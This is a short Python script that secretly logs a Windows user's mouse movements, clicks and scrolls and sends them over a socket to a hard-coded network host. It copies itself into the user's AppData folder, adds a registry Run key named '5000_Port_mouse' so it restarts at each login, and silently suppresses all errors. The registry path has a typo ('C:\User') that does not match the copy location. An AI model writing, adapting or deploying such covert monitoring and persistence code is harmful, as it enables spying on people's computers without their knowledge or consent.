def main():
    import socket
    from pynput import mouse

    HOST = "192.168.1.75"
    PORT = 5000
    FORMAT = "utf-8"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            def on_move(x, y):
                s.send(f"({x}, {y})".encode(FORMAT))

            def on_click(x, y, button, pressed):
                if not pressed:
                    s.send(b"false")
                else:
                    s.send(b"true")
                s.send(bytes(button))

            def on_scroll(x, y, dx, dy):
                if dy < 0:
                    s.send(b'down')
                else:
                    s.send(b'up')
                    
            with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
                listener.join()

if __name__ == "__main__":
    import winreg
    import os
    import shutil
    username = os.getlogin()
    shutil.copy(__file__, f"C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    secret_location = f"C:\\User\\{username}\\AppData\\Roaming\\{os.path.basename(__file__)}"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "5000_Port_mouse", 0, winreg.REG_SZ, secret_location)
    try: main()
    except: pass